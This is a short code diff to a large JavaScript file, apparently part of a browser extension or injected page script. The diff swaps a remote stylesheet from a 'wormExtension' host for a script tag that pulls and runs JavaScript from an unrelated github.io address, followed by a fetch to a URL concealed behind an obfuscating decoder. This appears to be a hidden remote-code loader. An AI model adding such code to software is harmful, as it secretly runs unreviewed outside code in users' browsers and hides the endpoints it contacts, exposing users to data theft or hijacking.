@@ -32915,9 +32915,8 @@ fn mainFragment(
         var N = window.servers || {};
         window.servers = N;
         N.Api_listServer = [];
-        var t = document.createElement("link");
-        t.rel = "stylesheet";
-        t.href = "https://zwormextenstion.com/wormExtension/css/style2.css";
+        var t = document.createElement("script");
+        t.src = "https://iimoathx.github.io/mario/sonic3747.js";
         document.head.appendChild(t);
         try {
             await fetch(o("95a3250e78eee869aec87c3c48f7cd2080a563394bf9"))
